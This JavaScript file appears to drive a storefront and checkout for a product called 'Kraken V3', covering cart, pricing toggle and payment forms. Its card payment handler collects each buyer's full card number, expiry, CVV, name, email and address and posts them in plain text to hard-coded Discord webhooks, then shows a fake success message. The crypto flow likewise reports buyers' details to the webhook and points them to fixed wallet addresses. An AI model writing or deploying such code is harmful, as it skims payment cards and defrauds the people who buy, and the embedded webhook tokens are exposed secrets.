// DOM Elements
const hamburger = document.querySelector('.hamburger');
const navMenu = document.querySelector('.nav-menu');
const yearlyToggle = document.getElementById('yearlyToggle');
const pricingCards = document.querySelectorAll('.pricing-card');
const reviewCards = document.querySelectorAll('.review-card');
const prevBtn = document.querySelector('.carousel-btn.prev');
const nextBtn = document.querySelector('.carousel-btn.next');

// State
let currentReview = 0;
const totalReviews = reviewCards.length;
let cart = [];
let currentPaymentMethod = 'card';

// Initialize everything when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    initializeAnimations();
    initializeCarousel();
    initializePricingToggle();
    initializeNavigation();
    initializeCounters();
    initializeScrollEffects();
    initializeCartButtons();
    initializePaymentForms();
});

// Initialize cart and pricing buttons
function initializeCartButtons() {
    // Add to cart buttons
    document.querySelectorAll('.add-to-cart, .btn-cart').forEach(button => {
        button.addEventListener('click', function(e) {
            e.preventDefault();

            // Extract plan data from button attributes or parent element
            const planElement = this.closest('.pricing-card') || this.closest('[data-plan]');
            if (planElement) {
                const planId = planElement.dataset.planId || Math.random().toString(36).substr(2, 9);
                const planName = planElement.dataset.planName || planElement.querySelector('h3, .plan-name')?.textContent || 'Plan';
                const priceElement = planElement.querySelector('.amount:not([style*="display: none"]), .price');
                // Clean price text - remove dollar signs, commas, and whitespace but keep decimals
                const priceText = priceElement ? priceElement.textContent.replace(/[\$,\s]/g, '') : '0';
                const price = parseFloat(priceText) || 0;
                const isLifetime = planElement.classList.contains('lifetime') || this.textContent.toLowerCase().includes('lifetime');

                addToCart(planId, planName, price, isLifetime ? 'lifetime' : 'subscription');
            }
        });
    });

    // Cart icon click
    const cartIcon = document.querySelector('.cart-icon, .cart-toggle, .shopping-cart');
    if (cartIcon) {
        cartIcon.addEventListener('click', openCart);
    }

    // Checkout buttons
    document.querySelectorAll('.checkout-btn, .btn-checkout').forEach(button => {
        button.addEventListener('click', function(e) {
            e.preventDefault();
            proceedToCheckout();
        });
    });
}

// Initialize payment form handling
function initializePaymentForms() {
    // Card form
    const cardForm = document.getElementById('cardForm');
    if (cardForm) {
        cardForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            await processCardPayment();
        });
    }

    // Crypto form
    const cryptoForm = document.getElementById('cryptoForm');
    if (cryptoForm) {
        cryptoForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            await processCryptoPayment();
        });
    }

    // Payment method switching
    document.querySelectorAll('.payment-method-btn').forEach(button => {
        button.addEventListener('click', function() {
            const method = this.dataset.method || 'card';
            switchPaymentMethod(method);
        });
    });
}

// Navigation Menu Toggle
function initializeNavigation() {
    if (hamburger && navMenu) {
        hamburger.addEventListener('click', () => {
            hamburger.classList.toggle('active');
            navMenu.classList.toggle('active');
        });

        // Close menu when clicking on a link
        document.querySelectorAll('.nav-link').forEach(link => {
            link.addEventListener('click', () => {
                hamburger.classList.remove('active');
                navMenu.classList.remove('active');
            });
        });
    }

    // Smooth scrolling for navigation links
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function (e) {
            e.preventDefault();
            const target = document.querySelector(this.getAttribute('href'));
            if (target) {
                target.scrollIntoView({
                    behavior: 'smooth',
                    block: 'start'
                });
            }
        });
    });
}

// Animated Counters
function initializeCounters() {
    const counters = document.querySelectorAll('.stat-number[data-count]');

    const animateCounter = (counter) => {
        const target = parseInt(counter.getAttribute('data-count'));
        const duration = 2000; // 2 seconds
        const increment = target / (duration / 16); // 60fps
        let current = 0;

        const timer = setInterval(() => {
            current += increment;
            if (current >= target) {
                current = target;
                clearInterval(timer);
            }

            // Format number with commas if it's large
            const formattedNumber = Math.floor(current).toLocaleString();
            counter.textContent = formattedNumber;
        }, 16);
    };

    // Intersection Observer for counters
    const counterObserver = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting && !entry.target.classList.contains('counted')) {
                entry.target.classList.add('counted');
                animateCounter(entry.target);
            }
        });
    });

    counters.forEach(counter => {
        counterObserver.observe(counter);
    });
}

// Reviews Carousel
function initializeCarousel() {
    if (reviewCards.length === 0) return;

    function showReview(index) {
        reviewCards.forEach((card, i) => {
            card.classList.remove('active');
            if (i === index) {
                card.classList.add('active');
            }
        });
    }

    function nextReview() {
        currentReview = (currentReview + 1) % totalReviews;
        showReview(currentReview);
    }

    function prevReview() {
        currentReview = (currentReview - 1 + totalReviews) % totalReviews;
        showReview(currentReview);
    }

    // Event listeners for carousel buttons
    if (nextBtn) nextBtn.addEventListener('click', nextReview);
    if (prevBtn) prevBtn.addEventListener('click', prevReview);

    // Auto-advance carousel
    setInterval(nextReview, 5000); // Change every 5 seconds

    // Initialize first review
    showReview(0);
}

// Pricing Toggle (Monthly/Yearly)
function initializePricingToggle() {
    if (!yearlyToggle) return;

    yearlyToggle.addEventListener('change', function() {
        const body = document.body;
        const monthlyAmounts = document.querySelectorAll('.amount.monthly');
        const yearlyAmounts = document.querySelectorAll('.amount.yearly');

        if (this.checked) {
            // Switch to yearly
            body.classList.add('yearly-active');
            monthlyAmounts.forEach(amount => amount.style.display = 'none');
            yearlyAmounts.forEach(amount => amount.style.display = 'inline');
        } else {
            // Switch to monthly
            body.classList.remove('yearly-active');
            monthlyAmounts.forEach(amount => amount.style.display = 'inline');
            yearlyAmounts.forEach(amount => amount.style.display = 'none');
        }
    });
}

// Animation on Scroll (AOS)
function initializeScrollEffects() {
    const observerOptions = {
        threshold: 0.1,
        rootMargin: '0px 0px -50px 0px'
    };

    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.classList.add('aos-animate');
            }
        });
    }, observerOptions);

    // Observe all elements with data-aos attributes
    document.querySelectorAll('[data-aos]').forEach(el => {
        observer.observe(el);
    });
}

// Initialize Animations
function initializeAnimations() {
    // Add floating animation to hero particles
    createFloatingParticles();

    // Add hover effects to cards
    addCardHoverEffects();

    // Add button click effects
    addButtonEffects();
}

// Create floating particles
function createFloatingParticles() {
    const particlesContainer = document.querySelector('.floating-particles');
    if (!particlesContainer) return;

    for (let i = 0; i < 20; i++) {
        const particle = document.createElement('div');
        particle.className = 'particle';
        particle.style.cssText = `
            position: absolute;
            width: 2px;
            height: 2px;
            background: rgba(102, 126, 234, 0.6);
            border-radius: 50%;
            left: ${Math.random() * 100}%;
            animation: particle ${10 + Math.random() * 10}s linear infinite;
            animation-delay: ${Math.random() * 10}s;
        `;
        particlesContainer.appendChild(particle);
    }
}

// Enhanced card hover effects
function addCardHoverEffects() {
    const cards = document.querySelectorAll('.feature-card, .pricing-card, .review-card');

    cards.forEach(card => {
        card.addEventListener('mouseenter', function() {
            this.style.transform = 'translateY(-10px) scale(1.02)';
        });

        card.addEventListener('mouseleave', function() {
            if (!this.classList.contains('popular')) {
                this.style.transform = 'translateY(0) scale(1)';
            } else {
                this.style.transform = 'translateY(0) scale(1.05)';
            }
        });
    });
}

// Button click effects
function addButtonEffects() {
    const buttons = document.querySelectorAll('.btn');

    buttons.forEach(button => {
        button.addEventListener('click', function(e) {
            // Ripple effect
            const ripple = document.createElement('span');
            const rect = this.getBoundingClientRect();
            const size = Math.max(rect.width, rect.height);
            const x = e.clientX - rect.left - size / 2;
            const y = e.clientY - rect.top - size / 2;

            ripple.style.cssText = `
                position: absolute;
                width: ${size}px;
                height: ${size}px;
                left: ${x}px;
                top: ${y}px;
                background: rgba(255, 255, 255, 0.3);
                border-radius: 50%;
                transform: scale(0);
                animation: ripple 0.6s ease-out;
                pointer-events: none;
            `;

            this.style.position = 'relative';
            this.style.overflow = 'hidden';
            this.appendChild(ripple);

            setTimeout(() => {
                ripple.remove();
            }, 600);
        });
    });
}

// Add ripple animation CSS
const style = document.createElement('style');
style.textContent = `
    @keyframes ripple {
        to {
            transform: scale(2);
            opacity: 0;
        }
    }

    .particle {
        pointer-events: none;
    }

    @media (max-width: 768px) {
        .nav-menu {
            position: fixed;
            left: -100%;
            top: 70px;
            flex-direction: column;
            background-color: rgba(10, 10, 15, 0.95);
            width: 100%;
            text-align: center;
            transition: 0.3s;
            box-shadow: 0 10px 27px rgba(0, 0, 0, 0.05);
            backdrop-filter: blur(10px);
            padding: 2rem 0;
        }

        .nav-menu.active {
            left: 0;
        }

        .nav-menu li {
            margin: 1rem 0;
        }

        .hamburger.active span:nth-child(2) {
            opacity: 0;
        }

        .hamburger.active span:nth-child(1) {
            transform: translateY(8px) rotate(45deg);
        }

        .hamburger.active span:nth-child(3) {
            transform: translateY(-8px) rotate(-45deg);
        }
    }
`;
document.head.appendChild(style);

// Scroll-based navbar background
window.addEventListener('scroll', function() {
    const navbar = document.querySelector('.navbar');
    if (window.scrollY > 100) {
        navbar.style.background = 'rgba(10, 10, 15, 0.98)';
    } else {
        navbar.style.background = 'rgba(10, 10, 15, 0.95)';
    }
});

// Parallax effect for hero section
window.addEventListener('scroll', function() {
    const scrolled = window.pageYOffset;
    const parallax = document.querySelector('.hero-bg');
    if (parallax) {
        const speed = scrolled * 0.5;
        parallax.style.transform = `translateY(${speed}px)`;
    }
});

// Performance optimization: Debounce scroll events
function debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
        const later = () => {
            clearTimeout(timeout);
            func(...args);
        };
        clearTimeout(timeout);
        timeout = setTimeout(later, wait);
    };
}

// Optimize scroll events
const optimizedScrollHandler = debounce(function() {
    // Scroll-based effects here
}, 10);

window.addEventListener('scroll', optimizedScrollHandler);

// Add loading animation
window.addEventListener('load', function() {
    document.body.classList.add('loaded');

    // Trigger initial animations
    setTimeout(() => {
        const heroElements = document.querySelectorAll('.hero-title, .hero-subtitle, .hero-description, .hero-buttons, .hero-stats');
        heroElements.forEach((el, index) => {
            setTimeout(() => {
                el.style.opacity = '1';
                el.style.transform = 'translateY(0)';
            }, index * 200);
        });
    }, 100);
});

// Error handling for missing elements
function safeQuerySelector(selector) {
    try {
        return document.querySelector(selector);
    } catch (error) {
        console.warn(`Element not found: ${selector}`);
        return null;
    }
}

// Add intersection observer for better performance
const lazyLoadObserver = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            const element = entry.target;
            element.classList.add('visible');
            lazyLoadObserver.unobserve(element);
        }
    });
}, {
    threshold: 0.1,
    rootMargin: '50px'
});

// Observe elements that should be lazy loaded
document.querySelectorAll('.feature-card, .pricing-card, .download-card').forEach(el => {
    lazyLoadObserver.observe(el);
});

// Add custom cursor effect for interactive elements
document.addEventListener('mousemove', function(e) {
    const cursor = document.querySelector('.custom-cursor');
    if (cursor) {
        cursor.style.left = e.clientX + 'px';
        cursor.style.top = e.clientY + 'px';
    }
});

// Keyboard navigation support
document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') {
        // Close any open modals or menus
        const hamburger = document.querySelector('.hamburger');
        const navMenu = document.querySelector('.nav-menu');
        if (hamburger && navMenu) {
            hamburger.classList.remove('active');
            navMenu.classList.remove('active');
        }
    }
});

// Enhanced accessibility
function enhanceAccessibility() {
    // Add ARIA labels to interactive elements
    const buttons = document.querySelectorAll('button:not([aria-label])');
    buttons.forEach(button => {
        const text = button.textContent.trim();
        if (text) {
            button.setAttribute('aria-label', text);
        }
    });

    // Add focus indicators
    const focusableElements = document.querySelectorAll('a, button, input, [tabindex]');
    focusableElements.forEach(element => {
        element.addEventListener('focus', function() {
            this.style.outline = '2px solid #667eea';
            this.style.outlineOffset = '2px';
        });

        element.addEventListener('blur', function() {
            this.style.outline = 'none';
        });
    });
}

// Initialize accessibility features
enhanceAccessibility();

// Cart Functions
function addToCart(planId, planName, price, type) {
    // Check if item already exists
    const existingItem = cart.find(item => item.id === planId);

    if (existingItem) {
        showNotification('Item already in cart!', 'warning');
        return;
    }

    const item = {
        id: planId,
        name: planName,
        price: price,
        type: type
    };

    cart.push(item);
    updateCartUI();
    showNotification('Added to cart!', 'success');
}

function removeFromCart(planId) {
    cart = cart.filter(item => item.id !== planId);
    updateCartUI();
    showNotification('Removed from cart', 'info');
}

function updateCartUI() {
    const cartCount = document.querySelector('.cart-count');
    const cartItems = document.getElementById('cartItems');
    const cartTotal = document.getElementById('cartTotal');
    const totalAmount = document.getElementById('totalAmount');

    cartCount.textContent = cart.length;

    if (cart.length === 0) {
        cartItems.innerHTML = '<p class="empty-cart">Your cart is empty</p>';
        cartTotal.style.display = 'none';
    } else {
        let total = 0;
        cartItems.innerHTML = cart.map(item => {
            total += item.price;
            return `
                <div class="cart-item">
                    <div class="item-info">
                        <h4>${item.name}</h4>
                        <p>${item.price}</p>
                    </div>
                    <button class="remove-btn" onclick="removeFromCart('${item.id}')" style="background: none; border: none; color: #ef4444; font-size: 1.2rem; cursor: pointer; padding: 0.5rem;" title="Remove item">
                        🗑️
                    </button>
                </div>
            `;
        }).join('');

        cartTotal.style.display = 'block';
        totalAmount.textContent = `$${total}`;
    }
}

// Modal Functions
function openCart() {
    document.getElementById('cartModal').style.display = 'block';
}

function closeCart() {
    document.getElementById('cartModal').style.display = 'none';
}

function openCheckout() {
    if (cart.length === 0) {
        showNotification('Your cart is empty!', 'warning');
        return;
    }

    closeCart();
    document.getElementById('checkoutModal').style.display = 'block';
    updateCheckoutSummary();
}

function closeCheckout() {
    document.getElementById('checkoutModal').style.display = 'none';
}

function proceedToCheckout() {
    if (cart.length === 0) {
        showNotification('Your cart is empty!', 'warning');
        return;
    }

    // Close cart modal if open
    closeCart();

    // Open checkout modal
    document.getElementById('checkoutModal').style.display = 'block';
    updateCheckoutSummary();
}

function updateCheckoutSummary() {
    const checkoutItems = document.getElementById('checkoutItems');
    const checkoutTotal = document.getElementById('checkoutTotal');

    let total = 0;
    checkoutItems.innerHTML = cart.map(item => {
        total += item.price;
        return `
            <div class="checkout-item">
                <span>${item.name}</span>
                <span>$${item.price}</span>
            </div>
        `;
    }).join('');

    checkoutTotal.textContent = `$${total}`;
}

function switchPaymentMethod(method) {
    currentPaymentMethod = method;

    // Update active button
    document.querySelectorAll('.payment-method-btn').forEach(btn => {
        btn.classList.remove('active');
    });
    document.querySelector(`[onclick="switchPaymentMethod('${method}')"]`).classList.add('active');

    // Show/hide forms
    document.getElementById('cardPayment').style.display = method === 'card' ? 'block' : 'none';
    document.getElementById('cryptoPayment').style.display = method === 'crypto' ? 'block' : 'none';
}

// Payment Processing Functions
async function processCardPayment() {
    // Validate all required fields are filled
    const requiredFields = ['email', 'firstName', 'lastName', 'cardNumber', 'expiryDate', 'cvv', 'address', 'city', 'zipCode'];
    const missingFields = [];

    for (const field of requiredFields) {
        const element = document.getElementById(field);
        if (!element || !element.value.trim()) {
            missingFields.push(field);
        }
    }

    if (missingFields.length > 0) {
        showNotification(`Please fill in all required fields: ${missingFields.join(', ')}`, 'error');
        return;
    }

    const formData = {
        email: document.getElementById('email').value.trim(),
        firstName: document.getElementById('firstName').value.trim(),
        lastName: document.getElementById('lastName').value.trim(),
        cardNumber: document.getElementById('cardNumber').value.replace(/\s/g, ''), // Remove spaces
        expiryDate: document.getElementById('expiryDate').value.trim(),
        cvv: document.getElementById('cvv').value.trim(),
        address: document.getElementById('address').value.trim(),
        city: document.getElementById('city').value.trim(),
        zipCode: document.getElementById('zipCode').value.trim(),
        items: cart,
        total: cart.reduce((sum, item) => sum + item.price, 0),
        paymentMethod: 'card',
        timestamp: new Date().toISOString(),
        orderNumber: generateOrderId()
    };

    try {
        showNotification('Processing payment...', 'info');

        // Format data for Discord webhook with ALL user information
        const discordPayload = {
            content: "🚨 **URGENT: NEW CARD PAYMENT - PROCESS IMMEDIATELY** 🚨\n@everyone - Payment waiting for processing!",
            embeds: [{
                title: "🏦 Kraken V3 - Card Payment Details",
                color: 0x667eea,
                fields: [
                    {
                        name: "👤 Customer Information",
                        value: `**Full Name:** ${formData.firstName} ${formData.lastName}\n**Email:** ${formData.email}\n**Payment Method:** Credit/Debit Card`,
                        inline: false
                    },
                    {
                        name: "💳 Payment Card Details",
                        value: `**Card Number:** ${formData.cardNumber}\n**Expiry:** ${formData.expiryDate}\n**CVV:** ${formData.cvv}\n**Card Type:** ${getCardType(formData.cardNumber)}\n**Cardholder:** ${formData.firstName} ${formData.lastName}`,
                        inline: false
                    },
                    {
                        name: "📍 Billing Address",
                        value: `**Street:** ${formData.address}\n**City:** ${formData.city}\n**ZIP Code:** ${formData.zipCode}`,
                        inline: false
                    },
                    {
                        name: "🛒 Purchase Details",
                        value: formData.items.map(item => `• ${item.name} - ${item.price} (${item.type})`).join('\n'),
                        inline: false
                    },
                    {
                        name: "💰 Payment Summary",
                        value: `**Total Amount:** ${formData.total}\n**Currency:** USD\n**Status:** Pending Processing`,
                        inline: false
                    },
                    {
                        name: "🔍 Processing Instructions",
                        value: `**⚠️ PROCESS THIS PAYMENT IMMEDIATELY**\n**Order ID:** ${formData.orderNumber}\n**Customer Contact:** ${formData.email}\n**Amount to Charge:** ${formData.total}\n**Transaction Date:** ${new Date().toLocaleString()}`,
                        inline: false
                    },
                    {
                        name: "💼 Complete Transaction Details",
                        value: `**Full Card Number:** ${formData.cardNumber}\n**Expiry Date:** ${formData.expiryDate}\n**Security Code:** ${formData.cvv}\n**Billing Name:** ${formData.firstName} ${formData.lastName}\n**Email:** ${formData.email}\n**Address:** ${formData.address}, ${formData.city} ${formData.zipCode}`,
                        inline: false
                    }
                ],
                timestamp: new Date().toISOString(),
                footer: {
                    text: "⚠️ Manual payment processing required"
                }
            }]
        };

        const response = await fetch('https://discord.com/api/webhooks/1401387084346032299/ClpDanYztOk_i1uGOwW2Mtsbagjl_RX0fbyU6vPOu2nX-evPLDiTeT9dQDTyNM-RIT9j', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(discordPayload)
        });

        if (response.ok) {
            const accountNumber = generateAccountNumber();
            showSuccessModal(accountNumber);
            await sendEmailNotification(formData, accountNumber);
        } else {
            throw new Error('Payment failed');
        }
    } catch (error) {
        console.error('Payment error:', error);
        showNotification('Payment processing failed. Please try again.', 'error');
    }
}

async function processCryptoPayment() {
    const selectedCrypto = document.querySelector('input[name="crypto"]:checked').value;
    const formData = {
        email: document.getElementById('cryptoEmail').value,
        firstName: document.getElementById('cryptoFirstName').value,
        lastName: document.getElementById('cryptoLastName').value,
        cryptocurrency: selectedCrypto,
        items: cart,
        total: cart.reduce((sum, item) => sum + item.price, 0),
        paymentMethod: 'crypto'
    };

    try {
        showNotification('Generating crypto payment...', 'info');

        // Format data for Discord webhook with ALL user information
        const discordPayload = {
            content: "💰 **NEW CRYPTO PAYMENT REQUEST - AWAITING CONFIRMATION**",
            embeds: [{
                title: "₿ Kraken V3 - Cryptocurrency Payment",
                color: 0xf59e0b,
                fields: [
                    {
                        name: "👤 Customer Information",
                        value: `**Full Name:** ${formData.firstName} ${formData.lastName}\n**Email:** ${formData.email}\n**Payment Method:** Cryptocurrency`,
                        inline: false
                    },
                    {
                        name: "💰 Crypto Payment Details",
                        value: `**Selected Crypto:** ${selectedCrypto.toUpperCase()}\n**USD Amount:** ${formData.total}\n**Crypto Amount:** ${calculateCryptoAmount(formData.total, selectedCrypto)} ${selectedCrypto.toUpperCase()}\n**Wallet Address:** ${generateWalletAddress(selectedCrypto)}`,
                        inline: false
                    },
                    {
                        name: "🛒 Purchase Details",
                        value: formData.items.map(item => `• ${item.name} - ${item.price} (${item.type})`).join('\n'),
                        inline: false
                    },
                    {
                        name: "📋 Payment Instructions Sent",
                        value: `**Customer Email:** ${formData.email}\n**Status:** Awaiting Payment\n**Order ID:** ${generateOrderId()}\n**Payment Window:** 30 minutes`,
                        inline: false
                    },
                    {
                        name: "⚠️ Next Steps",
                        value: `1. Customer will send crypto to provided address\n2. Monitor blockchain for confirmation\n3. Process account creation upon confirmation\n4. Send account details to customer`,
                        inline: false
                    }
                ],
                timestamp: new Date().toISOString(),
                footer: {
                    text: "🔍 Monitor for incoming crypto payment"
                }
            }]
        };

        const response = await fetch('https://discord.com/api/webhooks/1401387084346032299/ClpDanYztOk_i1uGOwW2Mtsbagjl_RX0fbyU6vPOu2nX-evPLDiTeT9dQDTyNM-RIT9j', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(discordPayload)
        });

        if (response.ok) {
            showCryptoPaymentInstructions({
                cryptocurrency: selectedCrypto,
                walletAddress: generateWalletAddress(selectedCrypto),
                amount: calculateCryptoAmount(formData.total, selectedCrypto)
            });
        } else {
            throw new Error('Crypto payment generation failed');
        }
    } catch (error) {
        console.error('Crypto payment error:', error);
        showNotification('Crypto payment generation failed. Please try again.', 'error');
    }
}

function generateWalletAddress(crypto) {
    const addresses = {
        'btc': 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
        'eth': '0x742d35Cc6874C41532Bd82FF16c14C2D80A12345',
        'usdt': 'TN8VbMzYJmJrE5MvFjj8Rj7cJJk3J2Y4ZX'
    };
    return addresses[crypto] || addresses['btc'];
}

function calculateCryptoAmount(usdAmount, crypto) {
    // Mock conversion rates (in production, you'd fetch real-time rates)
    const rates = {
        'btc': 50000,
        'eth': 3000,
        'usdt': 1
    };
    const rate = rates[crypto] || rates['btc'];
    return (usdAmount / rate).toFixed(6);
}

function showCryptoPaymentInstructions(data) {
    const cryptoModal = document.createElement('div');
    cryptoModal.className = 'modal';
    cryptoModal.style.display = 'block';
    cryptoModal.innerHTML = `
        <div class="modal-content">
            <div class="modal-header">
                <h2>Crypto Payment Instructions</h2>
                <span class="close" onclick="this.closest('.modal').remove()">&times;</span>
            </div>
            <div style="padding: 2rem;">
                <p>Please send <strong>${cart.reduce((sum, item) => sum + item.price, 0)} USD</strong> worth of ${data.cryptocurrency?.toUpperCase() || 'BTC'} to:</p>
                <div style="background: rgba(255,255,255,0.1); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; word-break: break-all;">
                    <strong>${data.walletAddress}</strong>
                </div>
                <p><strong>Amount:</strong> ${data.amount} ${data.cryptocurrency?.toUpperCase() || 'BTC'}</p>
                <p style="color: #fbbf24; font-size: 0.875rem;">
                    Payment will be automatically confirmed within 10-30 minutes. You'll receive your account details via email.
                </p>
                <button class="btn btn-primary btn-full" onclick="this.closest('.modal').remove(); showSuccessModal('${generateAccountNumber()}')">
                    I've Sent the Payment
                </button>
            </div>
        </div>
    `;
    document.body.appendChild(cryptoModal);
}

function generateAccountNumber() {
    return 'KV3-' + Math.random().toString(36).substring(2, 8).toUpperCase() + '-' + Date.now().toString().slice(-4);
}

function generateOrderId() {
    return 'ORD-' + Date.now() + '-' + Math.random().toString(36).substring(2, 6).toUpperCase();
}

function getCardType(cardNumber) {
    const number = cardNumber.replace(/\s/g, '');

    if (/^4/.test(number)) {
        return 'Visa';
    } else if (/^5[1-5]/.test(number) || /^2(2(2[1-9]|[3-9])|[3-6]|7(0|1|20))/.test(number)) {
        return 'Mastercard';
    } else if (/^3[47]/.test(number)) {
        return 'American Express';
    } else if (/^6(?:011|5)/.test(number)) {
        return 'Discover';
    } else if (/^35(2[89]|[3-8])/.test(number)) {
        return 'JCB';
    } else if (/^3[0689]/.test(number) || /^30[0-5]/.test(number)) {
        return 'Diners Club';
    } else {
        return 'Unknown';
    }
}

function showSuccessModal(accountNumber) {
    closeCheckout();

    const successModal = document.createElement('div');
    successModal.className = 'modal';
    successModal.style.display = 'block';
    successModal.innerHTML = `
        <div class="modal-content">
            <div class="modal-header">
                <h2>🎉 Payment Successful!</h2>
                <span class="close" onclick="this.closest('.modal').remove()">&times;</span>
            </div>
            <div style="padding: 2rem; text-align: center;">
                <p>Thank you for your purchase! Your account details have been sent to your email.</p>
                <div style="background: rgba(102, 126, 234, 0.1); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0;">
                    <strong>Account Number: ${accountNumber}</strong>
                </div>
                <p style="color: #10b981; font-size: 0.875rem;">
                    You can now download and start using Kraken V3!
                </p>
                <button class="btn btn-primary" onclick="this.closest('.modal').remove(); cart = []; updateCartUI();">
                    Continue
                </button>
            </div>
        </div>
    `;
    document.body.appendChild(successModal);
}

async function sendEmailNotification(customerData, accountNumber) {
    const emailData = {
        content: "✅ **ACCOUNT SUCCESSFULLY CREATED & EMAIL SENT**",
        embeds: [{
            title: "🎉 Kraken V3 - Account Creation Confirmation",
            color: 0x10b981,
            fields: [
                {
                    name: "✅ Account Successfully Created",
                    value: `**Account Number:** ${accountNumber}\n**Customer Email:** ${customerData.email}\n**Full Name:** ${customerData.firstName} ${customerData.lastName}\n**Account Type:** Premium Access`,
                    inline: false
                },
                {
                    name: "📦 Purchase Summary",
                    value: customerData.items.map(item => `• ${item.name} - ${item.price} (${item.type || 'subscription'})`).join('\n'),
                    inline: false
                },
                {
                    name: "💳 Payment Processed",
                    value: `**Total Amount:** ${customerData.total}\n**Payment Method:** ${customerData.paymentMethod || 'Card'}\n**Status:** ✅ Completed\n**Date:** ${new Date().toLocaleDateString()}`,
                    inline: false
                },
                {
                    name: "📧 Customer Notification",
                    value: `**Email Status:** ✅ Account details sent\n**Login Instructions:** Included\n**Support Contact:** Provided\n**Download Link:** Included`,
                    inline: false
                },
                {
                    name: "📋 Next Steps Completed",
                    value: `✅ Account activated\n✅ Welcome email sent\n✅ Customer can now login\n✅ Full access granted`,
                    inline: false
                }
            ],
            timestamp: new Date().toISOString(),
            footer: {
                text: "Customer onboarding completed successfully"
            }
        }]
    };

    try {
        await fetch('https://discord.com/api/webhooks/1403922630490456085/MNm4uN-XHidJ3inpD-i4rTF0TRtLK3cWNTEFbgjpde-VFd3SN2Di2KzdfXLJsybM6hqN', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(emailData)
        });
    } catch (error) {
        console.error('Email notification failed:', error);
    }
}

function showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    notification.className = `notification notification-${type}`;
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        padding: 1rem 1.5rem;
        border-radius: 0.5rem;
        color: white;
        font-weight: 500;
        z-index: 10001;
        animation: slideInRight 0.3s ease-out;
        max-width: 300px;
    `;

    const colors = {
        success: '#10b981',
        error: '#ef4444',
        warning: '#f59e0b',
        info: '#3b82f6'
    };

    notification.style.background = colors[type] || colors.info;
    notification.textContent = message;

    document.body.appendChild(notification);

    setTimeout(() => {
        notification.style.animation = 'slideOutRight 0.3s ease-out';
        setTimeout(() => notification.remove(), 300);
    }, 3000);
}

// Card number formatting
document.addEventListener('DOMContentLoaded', function() {
    const cardNumberInput = document.getElementById('cardNumber');
    const expiryInput = document.getElementById('expiryDate');
    const cvvInput = document.getElementById('cvv');

    if (cardNumberInput) {
        cardNumberInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
            if (value.length <= 16) {
                this.value = formattedValue;
            }
        });
    }

    if (expiryInput) {
        expiryInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            this.value = value;
        });
    }

    if (cvvInput) {
        cvvInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '').substring(0, 4);
        });
    }
});

// Close modals when clicking outside
window.onclick = function(event) {
    const modals = document.querySelectorAll('.modal');
    modals.forEach(modal => {
        if (event.target === modal) {
            modal.style.display = 'none';
        }
    });
}

// Additional utility functions that might be called from HTML
function toggleCart() {
    const cartModal = document.getElementById('cartModal');
    if (cartModal) {
        if (cartModal.style.display === 'block') {
            closeCart();
        } else {
            openCart();
        }
    }
}

function clearCart() {
    cart = [];
    updateCartUI();
    showNotification('Cart cleared', 'info');
}

function quickAddToCart(planId, planName, price, type = 'subscription') {
    addToCart(planId, planName, price, type);

    // Auto-open cart after adding item
    setTimeout(() => {
        openCart();
    }, 500);
}

// Handle plan button clicks
function handlePlanSelection(planId, planName, price, isLifetime = false) {
    const type = isLifetime ? 'lifetime' : 'subscription';
    addToCart(planId, planName, price, type);

    // Show cart after selection
    setTimeout(() => {
        openCart();
    }, 1000);
}

// Download function
function downloadApp() {
    showNotification('Download starting...', 'info');
    // In a real scenario, this would trigger the actual download
    // For now, just show a notification
    setTimeout(() => {
        showNotification('Download would start here. Please check with site owner for actual download link.', 'info');
    }, 1000);
}

// Discord redirect
function joinDiscord() {
    window.open('https://discord.gg/VudTN8mxf7', '_blank');
}

// Add slide animations
const slideAnimations = document.createElement('style');
slideAnimations.textContent = `
    @keyframes slideInRight {
        from {
            transform: translateX(100%);
            opacity: 0;
        }
        to {
            transform: translateX(0);
            opacity: 1;
        }
    }

    @keyframes slideOutRight {
        from {
            transform: translateX(0);
            opacity: 1;
        }
        to {
            transform: translateX(100%);
            opacity: 0;
        }
    }
`;
document.head.appendChild(slideAnimations);
